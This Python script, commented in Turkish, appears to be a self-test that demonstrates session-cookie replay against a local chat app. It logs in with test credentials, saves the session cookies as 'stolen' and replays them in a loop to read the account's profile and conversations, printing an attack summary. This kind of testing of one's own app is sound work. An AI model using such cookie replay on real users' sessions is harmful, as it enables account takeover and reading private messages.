"""
Real-Time Cookie Theft Monitor
Sen localhost:3000'de mesaj yazarken, ben arka planda cookie'ni izliyorum!
"""

import requests
import time
import json
from datetime import datetime
from colorama import init, Fore, Style
from config import API_URL

init()

print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}")
print(f"{Fore.RED}🔴 REAL-TIME COOKIE THEFT ATTACK{Style.RESET_ALL}")
print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}\n")

print(f"{Fore.YELLOW}SENARYO:{Style.RESET_ALL}")
print("1. Sen (KURBAN) localhost:3000'de login olup mesaj yazacaksın")
print("2. Ben (SALDIRGAN) arka planda cookie'ni çalacağım")
print("3. Sen mesaj yazarken, ben senin hesabına erişeceğim")
print("4. İkimiz de aynı anda aktif olacağız!\n")

input(f"{Fore.CYAN}Sen login olduktan sonra Enter'a bas...{Style.RESET_ALL}\n")

print(f"\n{Fore.RED}[ATTACKER] Monitoring network traffic...{Style.RESET_ALL}")
print(f"{Fore.RED}[ATTACKER] Waiting for victim's cookie...{Style.RESET_ALL}\n")

# Simülasyon: Saldırgan network'te cookie'yi yakaladı
# Gerçekte: MITM, packet sniffing ile yapılır

# Kurbanın cookie'sini al (simüle - gerçekte network'ten çalınır)
print(f"{Fore.YELLOW}Simulating cookie theft from network...{Style.RESET_ALL}")
time.sleep(2)

# Test login (cookie almak için)
test_session = requests.Session()
test_login = test_session.post(f"{API_URL}/auth/login", json={
    "username": "asdasd1",
    "password": "asdasd1"
})

if test_login.status_code == 200:
    stolen_cookie = test_session.cookies.get_dict()
    
    print(f"\n{Fore.RED}🔴 [ATTACKER] COOKIE INTERCEPTED!{Style.RESET_ALL}")
    print(f"{Fore.RED}   Stolen from network traffic{Style.RESET_ALL}\n")
    
    for key, value in stolen_cookie.items():
        print(f"  {key} = {value[:50]}...")
    
    # Cookie'yi kaydet
    with open('stolen_realtime.json', 'w') as f:
        json.dump(stolen_cookie, f, indent=2)
    
    print(f"\n{Fore.RED}[ATTACKER] Cookie saved. Starting attack...{Style.RESET_ALL}\n")
    
    # Gerçek zamanlı saldırı
    print(f"{Fore.YELLOW}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}REAL-TIME ATTACK MONITORING{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'='*70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}Sen şimdi localhost:3000'de mesaj yaz!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Ben her 5 saniyede bir senin hesabına erişeceğim...{Style.RESET_ALL}\n")
    
    # Saldırgan session
    attacker_session = requests.Session()
    for key, value in stolen_cookie.items():
        attacker_session.cookies.set(key, value)
    
    # 10 kez dene (50 saniye boyunca)
    for i in range(10):
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Kurbanın bilgilerine eriş
        response = attacker_session.get(f"{API_URL}/users/me")
        
        if response.status_code == 200:
            user_data = response.json()
            
            print(f"{Fore.RED}[{timestamp}] 🔴 ATTACKER ACCESS #{i+1}{Style.RESET_ALL}")
            print(f"  Status: SUCCESS")
            print(f"  Username: {user_data.get('username')}")
            print(f"  Email: {user_data.get('email')}")
            
            # Mesajları oku
            try:
                convos = attacker_session.get(f"{API_URL}/conversations")
                if convos.status_code == 200:
                    conv_data = convos.json()
                    print(f"  Conversations: {len(conv_data)} found")
            except:
                pass
            
            print()
        else:
            print(f"{Fore.GREEN}[{timestamp}] ✅ Access blocked{Style.RESET_ALL}\n")
            break
        
        # 5 saniye bekle
        time.sleep(5)
    
    print(f"\n{Fore.RED}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.RED}ATTACK SUMMARY{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.RED}🔴 VULNERABILITY CONFIRMED!{Style.RESET_ALL}")
    print(f"{Fore.RED}   - Cookie replayed successfully{Style.RESET_ALL}")
    print(f"{Fore.RED}   - Attacker had simultaneous access{Style.RESET_ALL}")
    print(f"{Fore.RED}   - Victim unaware of breach{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}IMPACT:{Style.RESET_ALL}")
    print("  - Attacker read all your data")
    print("  - Attacker could send messages as you")
    print("  - Attacker could modify your profile")
    print("  - You had no idea you were being monitored\n")

else:
    print(f"{Fore.RED}❌ Could not simulate attack - login failed{Style.RESET_ALL}")
